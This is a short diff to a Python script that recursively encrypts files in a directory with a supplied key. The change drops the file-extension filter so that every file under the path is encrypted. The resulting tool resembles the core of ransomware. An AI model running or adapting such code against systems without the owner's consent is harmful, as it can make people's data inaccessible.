@@ -65,24 +65,27 @@ def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
                 outfile.write(cipher.encrypt(chunk))
 
 # Define the recursive encryption function
-def encrypt_directory(key, path, extension):
+def encrypt_directory(key, path):
     for root, dirs, files in os.walk(path):
         for file in files:
             in_filename = os.path.join(root, file)
-            if in_filename.endswith(extension):
-                encrypt_file(key, in_filename)
+            encrypt_file(key, in_filename)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Encrypt files in a directory recursively.')
     parser.add_argument('path', metavar='PATH', type=str, help='the path to the directory')
     parser.add_argument('key', metavar='KEY', type=str, help='the encryption key')
-    parser.add_argument('-e', '--extension', metavar='EXT', type=str, default='.txt', help='the file extension to encrypt (default: .txt)')
     args = parser.parse_args()
 
     path = args.path
     key = args.key.encode('utf-8')
-    extension = args.extension
     
     print(banner)
-    encrypt_directory(key, path, extension)
+    
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            in_filename = os.path.join(root, file)
+            encrypt_file(key, in_filename)
+
+
 
